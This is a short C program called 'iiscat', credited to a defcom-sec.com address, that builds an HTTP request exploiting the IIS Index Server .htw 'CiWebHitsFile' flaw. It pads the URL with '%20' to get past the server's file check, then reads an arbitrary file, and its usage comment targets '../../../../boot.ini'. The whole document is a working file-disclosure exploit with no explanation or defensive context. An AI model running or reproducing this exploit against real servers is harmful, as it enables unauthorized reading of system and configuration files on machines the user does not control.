/* 
   fredrik.widlund@defcom-sec.com 
   
   example: iiscat ../../../../boot.ini
 */

#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char request[2048], *request_p, *file_read, *file_valid = "/default.htm";
  int file_buf_size = 250;
  
  if (!((argc == 2 && argv[1] && strlen(argv[1]) < 1024) || 
	(argc == 3 && argv[1] && argv[2] && strlen(argv[1]) <= file_buf_size && strlen(argv[2]) < 1024)))
    {
      fprintf(stderr, "usage: iiscat file_to_read [valid_file]\n");
      exit(1);
    }
  
  file_read = argv[1];
  if (argc == 3)
    file_valid = argv[2];

  sprintf(request, "GET %s", file_valid);
  request_p = request + strlen(request);

  file_buf_size -= strlen(file_valid);
  while(file_buf_size)
    {
      strcpy(request_p, "%20");
      request_p += 3;
      file_buf_size--;
    }

  sprintf(request_p, ".htw?CiWebHitsFile=%s&CiRestriction=none&CiHiliteType=Full HTTP/1.0\n\n", file_read);
  puts(request);

  exit(0);
}
